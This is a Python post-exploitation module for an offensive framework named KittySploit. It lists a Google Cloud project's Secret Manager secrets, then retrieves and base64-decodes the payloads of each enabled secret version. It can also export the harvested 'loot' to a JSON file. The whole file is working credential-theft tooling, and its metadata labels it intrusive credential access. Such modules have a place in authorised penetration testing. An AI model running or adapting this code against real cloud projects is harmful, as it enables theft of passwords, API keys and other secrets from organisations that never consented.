#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Secret Versions Loot",
        "description": "List Secret Manager secrets and access secret version payloads",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "secrets", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 5,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    secret_name = OptString("", "Specific secret resource name or short name; empty lists all secrets", False)
    access_versions = OptBool(True, "Access enabled secret versions and retrieve payloads", False)
    max_secrets = OptInteger(20, "Maximum secrets to process", False)
    mask_values = OptBool(True, "Mask secret payloads in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            print_info(f"Looting Secret Manager secrets in {project_id}...")
            secrets = self._resolve_secrets(project_id)
            if not secrets:
                print_warning("No secrets found")
                return self.module_result(success=True, data={"secrets": []})

            max_secrets = max(1, int(self.max_secrets or 20))
            secrets = secrets[:max_secrets]
            loot = []

            for secret in secrets:
                secret_resource = secret.get("name") or ""
                short_name = secret_resource.rsplit("/", 1)[-1]
                print_info(f"Secret: {short_name}")
                entry = {
                    "name": short_name,
                    "resource": secret_resource,
                    "createTime": secret.get("createTime"),
                    "replication": secret.get("replication"),
                    "versions": [],
                }

                versions = self._list_versions(secret_resource)
                for version in versions:
                    version_name = version.get("name", "")
                    version_entry = {
                        "version": version_name,
                        "state": version.get("state"),
                        "createTime": version.get("createTime"),
                    }
                    if self.access_versions and version.get("state") == "ENABLED":
                        payload = self._access_version(version_name)
                        version_entry["payload"] = payload.get("payload")
                        version_entry["access_error"] = payload.get("error")
                        if payload.get("payload") is not None:
                            rendered = self._render_payload(payload["payload"])
                            print_success(f"  accessed {version_name.rsplit('/', 1)[-1]}")
                            print_info(f"    value: {self._gcp_mask_value(rendered, mask=self.mask_values)}")
                        elif payload.get("error"):
                            print_warning(f"  access failed: {payload['error']}")
                    entry["versions"].append(version_entry)

                loot.append(entry)
                print_info("-" * 80)

            exported = self._gcp_export_json(self.export_json, {"project_id": project_id, "secrets": loot}) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")

            print_success(f"Processed {len(loot)} secret(s)")
            return self.module_result(success=True, data={"project_id": project_id, "secrets": loot})
        except Exception as exc:
            print_error(f"Secret loot failed: {exc}")
            return False

    def _resolve_secrets(self, project_id):
        configured = str(self.secret_name or "").strip()
        if configured:
            if configured.startswith("projects/"):
                return [{"name": configured}]
            return [{"name": f"projects/{project_id}/secrets/{configured}"}]

        result = self._gcp_request("secrets")
        if not result.get("ok"):
            return []
        body = result.get("body") or {}
        return body.get("secrets") or []

    def _list_versions(self, secret_resource):
        result = self._gcp_get(f"https://secretmanager.googleapis.com/v1/{secret_resource}/versions")
        if not result.get("ok"):
            return []
        body = result.get("body") or {}
        return body.get("versions") or []

    def _access_version(self, version_name):
        result = self._gcp_post(
            f"https://secretmanager.googleapis.com/v1/{version_name}:access",
            {},
        )
        if not result.get("ok"):
            return {"error": (result.get("raw") or "")[:500]}
        body = result.get("body") or {}
        payload = body.get("payload") or {}
        data = payload.get("data")
        if isinstance(data, str):
            try:
                data = base64.b64decode(data).decode("utf-8", errors="replace")
            except Exception:
                pass
        return {"payload": data}

    def _render_payload(self, value):
        if isinstance(value, (dict, list)):
            return json.dumps(value)
        return str(value)
